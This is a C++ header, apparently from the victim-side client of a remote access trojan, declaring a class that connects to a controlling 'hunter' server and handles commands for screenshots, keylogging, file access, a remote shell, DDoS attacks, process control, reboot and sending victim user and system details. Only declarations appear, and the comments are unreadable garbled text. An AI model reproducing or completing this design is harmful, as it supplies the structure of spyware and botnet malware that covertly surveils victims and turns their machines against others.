// ִ����Ҫ�߼�ѭ�� ������hunter�˽���
// food����ĳ��� ��װ�˽���������tcpsocket

#pragma once
#include "tcpsocket.h"
#include "Keybd.h"
#include "Shell.h"
#include "File.h"
#include <string>
#include <map>
#include <vector>

class Food
{
public:
	Food();

	HINSTANCE hInst;

	//-------------------------------------------------------------------------------
	// �������ͻ��˷��͵�ָ��
	std::string CmdSnapshoot;
	std::string CmdKeybd;
	std::string CmdFile;
	std::string CmdShell;
	std::string CmdDdos;
	std::string CmdProcess;

	std::string CmdSendBox;
	std::string CmdReboot;
	std::string CmdOffline;

	// �ͻ��������˷��͵�ָ��(���������Ҫ��Ҳ���������Լ���ָ��)
	std::string CmdLogin;
	//------------------------------------------------------------------------------

	// �ָ���źͽ�������
	std::string CmdSplit;
	std::string CmdEnd;
	//------------------------------------------------------------------------------
	void connectTo(std::string domain, int port);

private:
	TcpSocket mSock;
	std::string mBuf;

	std::string getUserName(); // ��ȡ�����û���
	std::string getSystemModel(); // ��ȡϵͳ�ͺ�
	// ���͵�¼��Ϣ
	bool sendLogin();
	// ���ݴ��� ��hunter������
	void addDataToBuffer(char* data, int size); // ����ָ�����
	void processCmd(std::string& cmd, std::string& data); // ִ����ش�����
	std::map<std::string, std::string> parseArgs(std::string& data); // ��������

	// ����ָ��Ĵ�����
	void doSnapshoot(std::map<std::string, std::string>& args);
	void doKeybd(std::map<std::string, std::string>& args);
	void doFile(std::map<std::string, std::string>& args);
	void doShell(std::map<std::string, std::string>& args);
	void doDdos(std::map<std::string, std::string>& args);
	void doSendBox(std::map<std::string, std::string>& args);
	void doReboot(std::map<std::string, std::string>& args);
	void doOffline(std::map<std::string, std::string>& args);
};

